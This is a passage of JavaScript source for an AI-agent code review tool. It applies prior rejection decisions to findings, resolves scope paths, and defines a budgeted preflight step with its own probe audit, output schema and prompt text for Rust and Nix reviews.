  return Array.isArray(o['unchanged']) ? { unchanged: ids(o['unchanged']), missing: ids(o['missing']) } : null
}

/**
 * Runs the scope check for `toCheck` (never with none; a commit-based check, an unknown commit raises
 * the finding and is reported — realm @nick/craft, node #184): the ids observed unchanged, and those whose
 * commit the repo does not know. A dead or unreadable answer shows nothing unchanged (said in `notes`).
 * @param {PriorDecision[]} toCheck @param {(toCheck: PriorDecision[]) => Promise<unknown>} checkScopes @param {string[]} notes
 * @returns {Promise<{ toCheck: PriorDecision[], unchanged: Set<string>, missing: Set<string> }>}
 */
async function runScopeCheck(toCheck, checkScopes, notes) {
  const unchanged = new Set(/** @type {string[]} */ ([]))
  const missing = new Set(/** @type {string[]} */ ([]))
  if (!toCheck.length) return { toCheck, unchanged, missing }
  const ids = readScopeCheck(await checkScopes(toCheck))
  if (ids == null) notes.push(`the scope-check agent died or answered unreadably — no decision could be shown unchanged, so the ${toCheck.length} decision(s) set nothing aside`)
  for (const id of ids?.unchanged || []) unchanged.add(id)
  for (const d of toCheck) if (ids?.missing.includes(d.id)) missing.add(d.id)
  return { toCheck, unchanged, missing }
}
// <<< craft-inline
// >>> craft-inline lib/prior-decision-apply.mjs priorDecisionMark commitMissingReason reraiseReason splitByDecisions priorRejectedSection applyPriorDecisions
/** The mark a set-aside finding carries. @param {PriorDecision} d */
function priorDecisionMark(d) {
  return `REJECTED BEFORE: ${d.reason} — ${d.who || 'author not recorded'}, ${d.when || 'date not recorded'}, ${d.link || 'no link'} (decision ${d.id})`
}

/** Why a decision did not apply when the repo does not know its commit (realm @nick/craft, node #184). @param {PriorDecision} d */
function commitMissingReason(d) {
  return `commit ${d.commit} not found in this repo — raised normally`
}

/**
 * Why decision `d` cannot set finding `f` aside; '' when it can. `missing`: ids whose commit the repo
 * does not know (a squash-merged branch, another clone) — named apart from a changed scope.
 * @param {DecidableFinding} f @param {PriorDecision} d @param {Set<string>} unchanged @param {Set<string>} [missing] @returns {string}
 */
function reraiseReason(f, d, unchanged, missing = new Set()) {
  if (reraisedBySeverity(f.severity)) return 'a Critical/High finding is never set aside by a prior decision'
  if (!d.commit) return 'the decision records no commit, so an unchanged scope cannot be established'
  if (missing.has(d.id)) return commitMissingReason(d)
  if (!unchanged.has(d.id)) return `the code in ${d.scope} changed since ${d.commit} (or that could not be checked)`
  return ''
}

/**
 * Split one tier's findings by the decisions. `unchanged` holds the ids of decisions whose scope was
 * observed unchanged since their commit; every other decision cannot set a finding aside. The mark
 * is appended to `noteField` — `why` in review, `description` in adversarial-review.
 * @template {DecidableFinding} F
 * @param {F[]} findings @param {PriorDecision[]} decisions @param {Set<string>} unchanged @param {string} tier @param {string} [noteField]
 * @param {Set<string>} [missing]  ids whose commit the repo does not know
 * @returns {{ kept: F[], setAside: Array<F & { priorTier: string, priorDecision: string }>, reraised: number }}
 */
function splitByDecisions(findings, decisions, unchanged, tier, noteField = 'why', missing = new Set()) {
  /** @type {F[]} */
  const kept = []
  /** @type {Array<F & { priorTier: string, priorDecision: string }>} */
  const setAside = []
  let reraised = 0
  for (const f of findings) {
    const d = decisions.find(x => decisionAnswers(f, x))
    if (!d) { kept.push(f); continue }
    const why = reraiseReason(f, d, unchanged, missing)
    const note = `${String(f[noteField] ?? '')} · `
    if (!why) { setAside.push({ ...f, priorTier: String(f.tier || tier), priorDecision: d.id, [noteField]: note + priorDecisionMark(d) }); continue }
    reraised++
    kept.push({ ...f, [noteField]: `${note}Rejected before (decision ${d.id}, ${d.who || 'author not recorded'}, ${d.when || 'date not recorded'}) — raised again: ${why}.` })
  }
  return { kept, setAside, reraised }
}

/**
 * The report section listing the findings set aside by a prior decision, each with its mark.
 * @param {DecidableFinding[]} setAside @returns {string}
 */
function priorRejectedSection(setAside) {
  if (!setAside.length) return ''
  return `\n\n## Rejected before (set aside — not in the verdict)\n`
    + setAside.map(f => `- ${String(f.severity ?? '?')} · \`${String(f.file || '?')}:${String(f['line'] || 0)}\` · ${String(f.title ?? '')} · ${String(f.why ?? '')}`).join('\n')
}

/**
 * Applies the decisions to every tier of an engine's findings. `checkScopes` runs the scope check for
 * the decisions it is handed (never called with none) and returns the agent's raw answer. `refused`:
 * the decisions whose commit the repo does not know, for the report's Prior decisions not applied.
 * @template {DecidableFinding} F
 * @param {Record<string, F[]>} tiers @param {PriorDecision[]} decisions
 * @param {(toCheck: PriorDecision[]) => Promise<unknown>} checkScopes @param {string} [noteField]
 * @returns {Promise<{ tiers: Record<string, F[]>, setAside: Array<F & { priorTier: string, priorDecision: string }>, reraised: number, notes: string[], refused: string[] }>}
 */
async function applyPriorDecisions(tiers, decisions, checkScopes, noteField = 'why') {
  /** @type {Array<F & { priorTier: string, priorDecision: string }>} */
  let setAside = []
  /** @type {string[]} */
  const notes = []
  if (!decisions.length) return { tiers, setAside, reraised: 0, notes, refused: [] }
  const { toCheck, unchanged, missing } = await runScopeCheck(decisionsToCheck(Object.values(tiers).flat(), decisions), checkScopes, notes)
  const refused = toCheck.filter(d => missing.has(d.id)).map(d => `decision ${d.id}: ${commitMissingReason(d)}`)
  let reraised = 0
  /** @type {Record<string, F[]>} */
  const out = {}
  for (const [tier, list] of Object.entries(tiers)) {
    const r = splitByDecisions(list, decisions, unchanged, tier, noteField, missing)
    out[tier] = r.kept
    setAside = setAside.concat(r.setAside)
    reraised += r.reraised
  }
  notes.push(`${decisions.length} decision(s) given, ${setAside.length} finding(s) set aside as rejected before, ${reraised} raised again`)
  return { tiers: out, setAside, reraised, notes, refused }
}
// <<< craft-inline

// The PR comment body for a Confirmed finding, with the marker a later session reads back.
// >>> craft-inline lib/finding-comment.mjs FINDING_COMMENT_MARKER commentLine findingCommentBody
const FINDING_COMMENT_MARKER = '<!-- craft-finding -->'

/** @param {unknown} v */
function commentLine(v) {
  return String(v ?? '').replace(/\s+/g, ' ').trim()
}

/**
 * The comment body for one finding: `[Severity] title`, the reason and the fix, the marker.
 * @param {{ severity?: unknown, title?: unknown, why?: unknown, fix?: unknown }} f @returns {string}
 */
function findingCommentBody(f) {
  return `[${commentLine(f.severity)}] ${commentLine(f.title)}\n\n${String(f.why ?? '').trim()} — ${String(f.fix ?? '').trim()}\n\n${FINDING_COMMENT_MARKER}`
}
// <<< craft-inline

// >>> craft-inline lib/path-segments.mjs pathSegments
/** @param {unknown} p */
function pathSegments(p) {
  const segs = []
  for (const s of String(p).split(/[\\/]+/)) {
    if (!s || s === '.') continue
    if (s === '..' && segs.length && segs[segs.length - 1] !== '..') { segs.pop(); continue }
    segs.push(s)
  }
  return segs
}
// <<< craft-inline
// The repo-relative spelling of `abs`, or null when `abs` is not inside `repo`.
/** @param {unknown} abs @param {unknown} repo */
function relativeToRepo(abs, repo) {
  const r = pathSegments(repo)
  const p = pathSegments(abs)
  if (!r.length || p.length < r.length) return null
  for (let i = 0; i < r.length; i++) if (p[i] !== r[i]) return null
  return p.slice(r.length).join('/')
}
// Settles an absolute `path` against `repo` once, before anything is dispatched.
function resolveScopePath() {
  if (ABSOLUTE_PATH.test(pathArg)) {
    const rel = repoArg ? relativeToRepo(pathArg, repoArg) : null
    if (rel != null) {
      // It names a directory inside the repo under review: that is a SCOPE, spelled absolutely. Keep
      // the narrowing the caller asked for — dropping it here would silently widen the review.
      log(`⚠️ path=${pathArg} is absolute but sits inside repo=${repoArg} — read as the repo-relative scope ${shq(rel)}.`)
      pathArg = rel
    } else if (repoArg) {
      const msg = `the requested scope path=${pathArg} was DROPPED: it is ABSOLUTE and does not resolve inside repo=${repoArg}, and an absolute pathspec matches nothing (the review would have seen an EMPTY diff). The review below therefore covers the WHOLE repository, not the requested scope — re-run with a repo-relative path to narrow it.`
      log(`⚠️ ${msg}`)
      // TWO STRINGS ON PURPOSE. `msg` is for a reader — it names this run's path and repo, and it
      // reaches the report's Scope section. `scopeNotRun` feeds the run record's `notRun`, which
      // lib/analyze-runs.mjs ranks BY EXACT STRING to surface repeated fragility: a path in there
      // makes every dispatch of the same shape its own count-1 row and sinks the real repeats. Same
      // argument that moved the uncovered-files note out of `notRun` entirely.
      scopeNotRun = ['the requested scope was DROPPED — an absolute `path` that does not resolve inside `repo`, so the review covered the whole repository instead']
      scopeDetail = msg
      pathArg = ''
    } else {
      // No `repo` to decide against. Refusing costs nothing and says exactly what to do; either guess
      // costs a full run and reports a scope nobody asked for.
      ambiguousPath = pathArg
    }
  }
}
resolveScopePath()
// Where craft itself lives, so the logger can find lib/craft-log-run.mjs. As an installed plugin
// CLAUDE_PLUGIN_ROOT is set for us; when the engine is launched by scriptPath from a checkout it is
// NOT, and the `:-.` fallback would resolve against the REVIEWED repo — the script would simply not
// be there and the whole record would be lost to a "Cannot find module". Pass craftRoot then.
const craftRootArg = argString('craftRoot')
// Every logger command runs as `cd <reviewed repo> && node <logger>`, so the `:-.` fallback would be
// resolved AFTER the cd — against the reviewed repo, where the script is not. That lost every
// checkpoint, the finalize record and the prior-round chain to "Cannot find module", silently.
// Resolve the path to an absolute one FIRST, in a variable, then change directory. The prelude
// itself is shared with every other record-filing engine (lib/run-logging.mjs, inlined below).
// A FUNCTION, not a constant, and the reason is mechanical: `CRAFT_VERSION` is declared far below
// (release-please owns that line and its position), so computing the prelude here would either hit
// the temporal dead zone or — as it did for one commit — quietly omit the version and leave this
// engine's third logger command, the prior-round read, refusing exactly as before the fix while the
// other two found their script. Deferring the call to use time is what lets all three agree.
const loggerPreludeNow = () => loggerPrelude(craftRootArg, CRAFT_VERSION, repoArg)
const LOGGER_PATH = '"$CRAFT_LOGGER"'
const viaArg = argString('_via')   // set by a parent workflow (e.g. rust-audit)
const strict = !!A['strict']   // harsh maintainability mode: confirmed maintainability findings become presumptive blockers
// The project's recorded rejections, passed by the launcher. Absent → this engine recalls them itself
// once the diff's paths are known (recallMemory). Malformed → nothing of it applied, and every report says what was refused.
let priorDecisionsIn = parsePriorDecisions(A['priorDecisions'])
// Where the decisions came from; every report names it.
let memory = initialMemory(A['priorDecisions'], priorDecisionsIn.decisions.length)
for (const r of priorDecisionsIn.refused) log(`⚠️ priorDecisions: ${r}`)
// The pin, RAW. Normalising it here as well as in `resolveProfilePin` is what made the helper's
// hardening unreachable: an `Array.isArray` guard here turned a scalar `languages: 'rust'` into
// `null` (pin silently dropped, review auto-detected instead), while a `.map(String)` turned
// `[null]` into the string `'null'` — an "unknown id" that hard-aborted the run. One normalizer:
// `resolveProfilePin` is the single place that decides what a pin means.
const requestedLangs = A['languages']
const freshArg = !!A['fresh']   // force a full first-pass review, ignore any prior round
// Every Nth re-review re-scans the FULL base...HEAD diff instead of only the fix delta, so a defect in
// code an intermediate round did not touch is re-discovered. Default 3; 1 = every re-review is a full
// re-scan (stateless, like adversarial-review); 0 = never (pure incremental — the pre-guard behavior).
const fullEvery = fullEveryArg()
/** @returns {number} */
function fullEveryArg() {
  return (A['fullEvery'] != null) ? Math.max(0, Number(A['fullEvery'])) : 3
}

// A cold full-workspace build is the one step in this workflow that can run for an hour and take the
// whole review down with it: a gate agent that sits in `cargo clippy` stops emitting, the harness
// calls it stalled, re-dispatches it, and the replacement starts the same build from scratch. One
// real run burned 99 minutes across six gate agents that way and returned nothing. craft already
// treats an ABSENT tool as an intentional skip; a tool that cannot finish in budget is the same
// thing — an unestablished signal, which is a fine review outcome, unlike a dead run.
const GATE_TIME_BUDGET = `
TIME BUDGET (hard): wrap EVERY build/lint/test command in \`timeout\` so the shell kills it instead of
you waiting — e.g. \`timeout 600 cargo clippy … ; echo "EXIT=\${PIPESTATUS[0]}"\`. Allow roughly 10
minutes for the primary gate command and 5 for each optional one. A command that hits the timeout is
NOT a failure and NOT a retry: record that signal as unknown, say in notes which command timed out and
after how long, and move on to the next one. Never re-run a timed-out build hoping it is faster the
second time — the cache is no warmer and you will spend the whole review on it. status=fail is
reserved for a check that actually RAN and came back red. If the primary gate times out, the review
continues on the remaining signals with status=unknown — an incomplete gate beats a dead run.`

// ---- preflight: resolve the environment ONCE, before anything expensive ----
// This used to be improvised inside the gate agent, which learned it the expensive way — a measured
// run spent 50s discovering it was outside the repo's dev shell and 113s discovering the crate cannot
// compile without a database, and reported neither signal. Worse, every agent that later runs a tool
// (the gate, a lens re-running clippy, a verifier doing its MECHANICAL CHECK) rediscovered the same
// facts independently. Resolve them once, cheaply, and hand the answer to everyone downstream.
// The probe budget and its audit live in a linted module with real unit tests, and are pasted back
// in here by the craft-inline gate, because this script cannot be imported (top-level export +
// await + return). The module's header carries why the audit is a DECLARATION audit and what that
// does and does not close.
// >>> craft-inline lib/preflight-probes.mjs PROBE_BUDGETS probeDeclarationBlock auditPreflightProbes readProbeEntry probeCallCount probeBudgetProblems
const PROBE_BUDGETS = {
  'ci-check-runs': { max: 1, what: 'gh api repos/{owner}/{repo}/commits/$SHA/check-runs' },
  'ci-commit-status': { max: 1, what: 'gh api repos/{owner}/{repo}/commits/$SHA/status' },
  'ci-pr-checks': { max: 0, what: 'gh pr checks — resolves by branch; forbidden, the SHA-scoped calls answer it' },
  'ci-pr-by-commit': { max: 0, what: 'gh api …/commits/$SHA/pulls — forbidden in preflight; the gate owns PR lookup' },
  'workflow-file': { max: 2, what: 'reading a .github/workflows/*.yml behind a green check' },
  'tool-inventory': { max: 2, what: 'the one-shot command -v loop (once bare, once under the runner prefix)' },
  'runner-verify': { max: 2, what: 'an instant <prefix>true / <prefix>rustc --version' },
  'blocker-probe': { max: 4, what: 'the grep/ls/test questions behind a compile blocker, and for Nix the flake-metadata and `system`-match checks' },
  'repo-identity': { max: 2, what: 'git rev-parse HEAD / git remote get-url origin' },
  'runner-discover': { max: 2, what: 'the ls/test sweep for the dev-shell markers (.envrc, flake.nix, shell.nix, .direnv/)' },
}

function probeDeclarationBlock() {
  const rows = Object.entries(PROBE_BUDGETS).map(([id, b]) => b.max === 0
    ? `   - \`${id}\`: FORBIDDEN (${b.what}) — declaring calls > 0 here is a violation, not a note`
    : `   - \`${id}\`: at most ${b.max} (${b.what})`)
  return `5. DECLARE YOUR PROBES. Return \`probes\`: one entry per source you consulted, \`{ "source": "<id>", "calls": <how many shell/API invocations you spent on it> }\`. Count every invocation, including ones that returned nothing. The ids and their budgets:
${rows.join('\n')}
   Use these ids EXACTLY; an id not on this list is itself reported as a violation, so a repeat cannot be relabelled into a fresh question. A source you did not consult is simply absent (do not declare it with \`calls: 0\`), and \`calls\` is a whole number ≥ 0 on every entry — a missing, non-integer or negative count is itself a violation. \`probes\` can NEVER be empty and is never emptied by a partial result: it reports what you ALREADY did, so running out of time shortens the list, it does not erase it — an empty list is reported as a violation, not read as a disciplined run. THE ENGINE AUDITS THIS: an over-budget or forbidden or unrecognized source is named in the run's log and carried into its record. Declaring fewer calls than you made is a false report, which is worse than an over-budget honest one.`
}

/** @param {{ probes?: unknown } | null | undefined} pf  the preflight agent's structured answer (model output)
 * @returns {string[]} */
function auditPreflightProbes(pf) {
  if (!pf) return []
  const out = []
  const probes = Array.isArray(pf.probes) ? pf.probes : null
  if (!probes) {
    out.push('preflight declared no `probes` list — the per-source budget could not be audited')
    return out
  }
  if (probes.length === 0) {
    out.push('preflight declared an EMPTY `probes` list — a preflight consults something by definition, and an empty declaration is not a clean one (a partial run still reports what it did)')
    return out
  }
  /** @type {Map<string, number>} */
  const seen = new Map()
  for (const entry of probes) {
    const read = readProbeEntry(entry)
    if (typeof read === 'string') { out.push(read); continue }
    seen.set(read.id, (seen.get(read.id) ?? 0) + read.calls)
  }
  out.push(...probeBudgetProblems(seen))
  return out
}

/** @param {unknown} entry @returns {{ id: string, calls: number } | string} */
function readProbeEntry(entry) {
  const p = entry && typeof entry === 'object' ? /** @type {{ source?: unknown, calls?: unknown }} */ (entry) : null
  const id = String((p && p.source) || '').trim()
  if (!id) return 'a `probes` entry has no `source`'
  if (!Object.prototype.hasOwnProperty.call(PROBE_BUDGETS, id)) {
    return `unrecognized probe source \`${id}\` — not one of the declared ids, so its budget is unknown`
  }
  const calls = probeCallCount(id, p ? p.calls : undefined)
  return typeof calls === 'string' ? calls : { id, calls }
}

/** @param {string} id @param {unknown} raw @returns {number | string} */
function probeCallCount(id, raw) {
  if (raw == null) {
    return `probe source \`${id}\` declared no \`calls\` — an entry without a count cannot be audited, and a missing count is not zero`
  }
  const calls = Number(raw)
  if (!Number.isInteger(calls)) {
    return `probe source \`${id}\` declared a non-integer call count \`${String(raw)}\` — invocations are counted in whole numbers`
  }
  if (calls < 0) {
    return `probe source \`${id}\` declared a negative call count ${calls} — a call cannot be un-made, and a negative must not offset a real one`
  }
  return calls
}

/** @param {Map<string, number>} seen @returns {string[]} */
function probeBudgetProblems(seen) {
  const out = []
  for (const [id, total] of seen) {
    const { max, what } = PROBE_BUDGETS[/** @type {keyof typeof PROBE_BUDGETS} */ (id)]
    if (max === 0 && total > 0) out.push(`forbidden probe source \`${id}\` used ${total}×: ${what}`)
    else if (total > max) out.push(`probe source \`${id}\` used ${total}×, budget ${max}: ${what}`)
  }
  return out
}
// <<< craft-inline
/** @type {Schema<PreflightAnswer>} */
const PREFLIGHT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['runner', 'blockers', 'missingTools', 'ciCovers', 'probes', 'partial', 'notes'],
  properties: {
    runner: { type: 'string', description: 'prefix every build/lint command needs, e.g. "direnv exec . " or "nix develop -c " — empty string if commands run bare' },
    blockers: { type: 'array', items: { type: 'string' }, description: 'reasons this tree CANNOT compile here, one per line, e.g. "sqlx query macros need a live Postgres; no offline .sqlx cache and no DATABASE_URL"' },
    missingTools: { type: 'array', items: { type: 'string' }, description: 'gate tools not on PATH (cargo-audit, cargo-deny, semgrep, …)' },
    ciCovers: { type: 'array', items: { type: 'string' }, description: 'signals a GREEN CI check already establishes for this exact HEAD, as "<signal> via <check name>" — e.g. "test via cargo nextest", "deny-bans via cargo-deny"' },
    // `minItems`/`minimum` are load-bearing, not decoration: without them `probes: []` and a negative
    // count were both VALID answers that the audit then read as clean — the cheapest possible path to
    // a green audit. The schema now refuses the shape and `auditPreflightProbes` refuses it again.
    probes: { type: 'array', minItems: 1, description: 'one entry per source consulted, with how many shell/API invocations it cost — audited against PROBE_BUDGETS; never empty, not even in a partial result, since it reports what was already done', items: { type: 'object', additionalProperties: false, required: ['source', 'calls'], properties: { source: { type: 'string', description: 'the probe-source id from the prompt\'s list, exactly' }, calls: { type: 'integer', minimum: 0, description: 'invocations spent on that source, including ones that returned nothing' } } } },
    partial: { type: 'boolean', description: 'true if ANY of the four fields was left unfinished (ran out of time, a command failed, gh unavailable) — the matching field is then empty and notes says which and why' },
    notes: { type: 'string' },
  },
}
/** @param {Profile} profile @param {Ctx} ctx */
function preflightPrompt(profile, ctx) {
  return `You are the PREFLIGHT for a ${profile.lang} review: resolve, cheaply and once, what the later steps must not rediscover. Diff base: ${ctx.baseRef ? `\`${flattenField(ctx.baseRef)}\`` : 'uncommitted changes / most recent commit'}.

This is reconnaissance, NOT the gate. Run nothing that compiles, builds, or takes more than a few seconds. Every answer below comes from reading the working tree or asking the API.

1. RUNNER. Does this repo pin its toolchain and system libraries in a dev shell? Look for \`.envrc\`, \`flake.nix\`, \`shell.nix\`, \`.direnv/\`. If so and \`direnv\`/\`nix\` is on PATH, the prefix is \`direnv exec . \` (preferred when \`.envrc\` exists and is allowed) or \`nix develop -c \`. Verify it works with something instant — \`<prefix>rustc --version\` or \`<prefix>true\` — never with a build. Outside such a shell, system libraries (openssl, protobuf, pkg-config) are absent and any build dies in a C dependency unrelated to the diff. Empty string only if the repo genuinely needs no prefix.

2. BLOCKERS — things that make a local build impossible no matter how long it runs, so nobody downstream wastes minutes proving it:
${profile.id === 'rust'
    ? `   - compile-time-checked SQL: \`sqlx\` in \`Cargo.lock\` with NO offline cache (no \`.sqlx/\` at the repo root or in the changed package) and no \`DATABASE_URL\` — every query macro tries to reach a live database and the crate fails to compile.
   - a build script or macro that needs a generated file, a private registry token (\`CARGO_REGISTRIES_*\`), or a service that is not running.
   - a toolchain the repo pins (\`rust-toolchain.toml\`) that is not installed and cannot be fetched offline.`
    : `   - an input the flake cannot fetch offline, a private registry/token the evaluation needs, or a builder platform this machine is not (\`system\` mismatch).`}
   Do this MECHANICALLY, not by judgement — these are \`grep\`/\`test\` questions with yes-or-no answers, and the one time this was left to inference the blocker was missed and the gate paid for a doomed compile anyway:
${profile.id === 'rust'
    ? `   \`\`\`
   grep -q '^name = "sqlx"' Cargo.lock && echo SQLX
   ls -d .sqlx */.sqlx **/.sqlx 2>/dev/null            # offline cache anywhere in the tree
   [ -n "$DATABASE_URL" ] && echo HAS_DB_URL
   \`\`\`
   SQLX present, no \`.sqlx\` directory found and no \`DATABASE_URL\` ⇒ report the blocker. Run those three commands; do not reason about whether the crate "probably" builds.`
    : `   Check the concrete inputs: \`nix flake metadata\` resolving offline, and whether the flake's \`system\` matches this machine.`}
   Report each blocker as one plain line naming what cannot run and WHY. Report nothing you have not actually checked.

3. MISSING TOOLS. Which of ${profile.id === 'rust' ? '`cargo-audit`, `cargo-deny`, `cargo-semver-checks`, `semgrep`' : '`statix`, `deadnix`, `nixpkgs-fmt`/`alejandra`, `nix-instantiate`'} are genuinely unavailable? ONE command answers it for every tool at once — run it exactly, do not probe tool-by-tool:
   \`\`\`
   for t in ${profile.id === 'rust' ? 'cargo-audit cargo-deny cargo-semver-checks semgrep' : 'statix deadnix nixpkgs-fmt alejandra nix-instantiate'}; do
     p=$(command -v "$t" 2>/dev/null); [ -z "$p" ] && [ -x "$HOME/.cargo/bin/$t" ] && p="$HOME/.cargo/bin/$t"
     echo "$t: \${p:-MISSING}"
   done
   \`\`\`
   A dev shell usually has a NARROWER PATH than the login shell, so if the runner prefix from step 1 is non-empty, run the same loop once more under it and treat a tool as PRESENT if EITHER pass found it — that mistake silently dropped the entire \`cargo audit\` signal from a real run. Name the invocation that works (e.g. "cargo-audit: ~/.cargo/bin/cargo-audit, outside the dev shell"). Only a tool MISSING in both passes goes in \`missingTools\` — an absent tool is an intentional skip downstream, never a failure.

4. CI COVERAGE. Which signals does a GREEN check already establish for THIS EXACT commit? TWO calls answer it, both SHA-scoped — the check-runs endpoint and the commit-status endpoint. Run those two, once each, and NOTHING else — in particular do NOT run \`gh pr checks\` and do NOT look the PR up by commit: those resolve by branch (empty on a review worktree or detached HEAD) or hand you a PR whose head may have moved past your commit, and both then need the SHA test this call satisfies by construction.
   \`\`\`
   SHA=$(git rev-parse HEAD)
   gh api "repos/{owner}/{repo}/commits/$SHA/check-runs" --jq '.check_runs[] | "\\(.name) \\(.status) \\(.conclusion)"'
   gh api "repos/{owner}/{repo}/commits/$SHA/status" --jq '.statuses[] | "\\(.context) completed \\(.state)"'
   \`\`\`
   Owner/repo from \`git remote get-url origin\`. Both calls, once each: check-runs alone misses CI that reports through the older commit-status API, and that omission looks exactly like "no CI". Keep only \`completed\` rows whose conclusion/state is \`success\`.
   Then read the workflow behind a green check to learn what it ACTUALLY runs, not what its name suggests: a job called \`cargo-deny\` running \`check bans\` covers bans and NOT advisories or licenses, and that distinction is the whole value of this step. HARD CAP — this is where the pass runs away with the clock: read AT MOST 2 workflow files, only for green checks that map to a gate signal (build/test/clippy/fmt or a security tool). Never enumerate \`.github/workflows/*\` wholesale. Past the cap, the remaining green checks go in \`notes\` BY NAME ONLY and NEVER in \`ciCovers\` — \`ciCovers\` means "do not re-run this locally", and a check whose workflow you did not open cannot support that: its name is a guess at what it ran, which is exactly what the \`cargo-deny\`/\`check bans\` example above shows going wrong. Only a signal you read the workflow for goes in \`ciCovers\`.
   List one entry per covered signal, e.g. "test via cargo nextest", "deny-bans via cargo-deny (command: check bans)". If gh is missing, unauthenticated or offline, return an empty list and say so in notes.

${probeDeclarationBlock()}

BUDGET (hard): reconnaissance, target ~90 seconds, three minutes is the ceiling. Past the dispatch deadline nothing cuts you off — the caller simply STOPS WAITING for you and dispatches a second preflight, so everything you do after that point is discarded and paid for twice, and if the second pass is as slow the gate loses even the runner prefix. So at three minutes STOP and RETURN. A thorough preflight costing more than the steps it saves is a net loss (measured: the first version took 207s and made the gate+preflight pair SLOWER than the gate had been alone). Never run a build, a test, or a full lint here.

PARTIAL RESULTS ARE THE EXPECTED SHAPE, NOT A FAILURE — but they must be legible as partial. Any of the four FINDINGS fields above (runner, blockers, missingTools, ciCovers) you did not finish: set \`partial: true\`, return the field EMPTY, and open \`notes\` with \`PARTIAL: <field> not established (<why>)\`, one clause per unfinished field. \`partial\` is the flag downstream reads — the note explains it, it does not replace it. An empty \`ciCovers\` with no such note means "CI covers nothing", and a downstream step will re-establish every signal locally on that reading — so never let "I ran out of time" arrive looking like "I checked and there was nothing".
\`probes\` (step 5) IS EXPLICITLY EXCLUDED FROM THAT INSTRUCTION: it is not a finding but a report of what you ALREADY DID, so it can never be returned empty — a run cut short declares the calls it had already spent, and an empty \`probes\` is read as a violation, never as a disciplined pass.

Return runner, blockers, missingTools, ciCovers, probes, partial, notes.`
}
// An unfinished preflight must not be recorded as a clean one. The schema carries an explicit
// `partial` boolean precisely so this does not hang on the shape of prose: the earlier test was
// anchored at the start of the note, so one clause of preamble before the marker
// ("Ran out of time. PARTIAL: ciCovers …") produced status 'ok' over unfinished fields. The note is
// still consulted, unanchored, as a fallback for a model that writes the prose but omits the flag.
// The fallback matches only the MARKER the prompt mandates — uppercase `PARTIAL:` — never the bare
// word: `notes` now also carries CI CHECK NAMES (the past-the-cap list), and a green check called
// `partial-build` matched `/\bPARTIAL\b/i` and flipped a complete preflight to 'partial'.
/** @param {Preflight | null | undefined} pf */
function preflightIsPartial(pf) {
  if (!pf) return false
  if (pf.partial === true) return true
  return /\bPARTIAL:/.test(flattenField(pf.notes || ''))
}

// Rendered into every downstream prompt that might run a tool, so the answer travels with the work.
/** @param {Preflight | null | undefined} pf */
function preflightBrief(pf) {
  // A dead preflight must NOT render as a clean one. Returning '' left the downstream prompt with no
  // preflight block at all — indistinguishable from a run where preflight said "nothing to report",
  // which is the permissive reading of "we could not establish it". Say it out loud instead.
  if (!pf) return `PREFLIGHT UNAVAILABLE — the preflight step failed or passed its deadline and returned nothing. Nothing below is resolved for you: no command prefix, no compile blockers, no tool inventory, no CI coverage. Establish what you need yourself, CHEAPLY (read the tree; never run a build to read its error), and say "preflight unavailable" in your provenance so the record shows this run was short one step.\n`
  const runner = pf.runner ? `\`${flattenField(pf.runner)}\`` : '(none needed — commands run bare)'
  const lines = [`PREFLIGHT (already resolved — do NOT rediscover any of this):`,
    `- Command prefix for every build/lint/test command: ${runner}. Commands run without it die in missing system libraries, not in your diff.`]
  if (pf.blockers?.length) lines.push(`- CANNOT BUILD HERE: ${pf.blockers.map(flattenField).join(' · ')}. Any step that needs a compile is UNRUNNABLE — skip it and say so; do NOT run it to watch it fail.`)
  if (pf.missingTools?.length) lines.push(`- Not installed (probed both bare and inside the dev shell): ${pf.missingTools.map(flattenField).join(', ')} — an absent tool is an intentional skip, never a failure. If you can nonetheless invoke one (a full path, \`nix run nixpkgs#<tool> --\`), do, and say so in provenance.`)
  lines.push(pf.ciCovers?.length
    ? `- Already GREEN in CI for this exact commit: ${pf.ciCovers.map(flattenField).join(' · ')}. Do NOT re-run these locally — CI ran the project's real command on a clean machine. Cite the check in provenance instead.`
    : `- CI covers nothing for this commit (or could not be consulted) — every signal must be established locally or reported unknown.`)
  if (pf.notes) lines.push(`- Preflight notes: ${flattenField(pf.notes)}`)
  return lines.join('\n') + '\n'
}

// ================= language profiles (inline registry — the sandbox can't import, so profiles live here) =================
/** @param {Ctx} _ctx */
function rustDepContext(_ctx) {
  return `8. **Dependency context** — review against the crate versions the project ACTUALLY pins, not against crates-in-the-abstract. Resolve them: \`cargo metadata --format-version 1\` (or read \`Cargo.lock\`) and match the external crates the changed files \`use\` to their locked versions. For any nontrivial dependency the diff touches, check whether the usage is correct *for that pinned version* — a since-deprecated/removed/renamed API, a changed default, a known footgun of that exact version. Consult context7 for the crate's version-specific docs instead of trusting memory. Turn a genuine version-specific misuse into a seed finding (source "dep-context", severity Medium, ruleId "DEP-001"). Known-vulnerable versions are already covered by \`cargo audit\` (ruleId "DEP-002") — do not duplicate. Best-effort: skip silently if \`cargo metadata\` fails or the diff touches no external crate.`
}
/** @param {Ctx} ctx */
function rustGate(ctx) {
  return `You are establishing the mechanical gate for a Rust review, CI-aware, and collecting tool-grounded seed findings. Diff base: ${ctx.baseRef ? `\`${flattenField(ctx.baseRef)}\`` : 'uncommitted changes / most recent commit'}.

${preflightBrief(ctx.preflight)}
GATE (CI-aware, per the rust-review skill — load it):
0. USE THE PREFLIGHT ABOVE. Its command prefix goes on every cargo invocation; its blockers make the matching steps unrunnable (skip them and record WHY in provenance — "pedantic seeds unavailable: sqlx macros need Postgres"); its ciCovers list is the set of signals you must NOT re-establish locally. It was resolved by a separate step precisely so this one does not pay to rediscover it. If it is absent or empty, fall back to establishing these yourself — but cheaply, by reading the tree, never by running a build to read its error.
1. Detect a PR + CI — if preflight returned a non-empty ciCovers, that list is the VERIFIED SUBSET of the detection, not the whole of it: preflight reads at most two workflow files, so a green check past that cap is named in its \`notes\` BY NAME ONLY and is absent from ciCovers. So: never re-run the gh detection for a signal already in ciCovers (~90s for an answer you were handed), and for a check named in \`notes\` but NOT in ciCovers, either open that one workflow yourself to learn what it actually runs — and only then treat it as coverage — or establish the signal locally. A bare check name is never coverage; \`test-and-lint\` may run neither. If ciCovers is non-empty and \`notes\` names no further green checks, the detection is complete and you skip the gh calls entirely. \`gh pr checks --json name,state,bucket,link\` resolves the PR from the CURRENT BRANCH NAME, which fails whenever you are not sitting on the PR's own head branch — a review worktree (\`pr-1203-review\`), a detached HEAD, or a local rename all look like "no PR" even though CI ran and is green. That is a false negative that costs the whole CI shortcut, so when the branch lookup comes up empty, LOOK UP THE PR BY COMMIT before giving up:
   \`\`\`
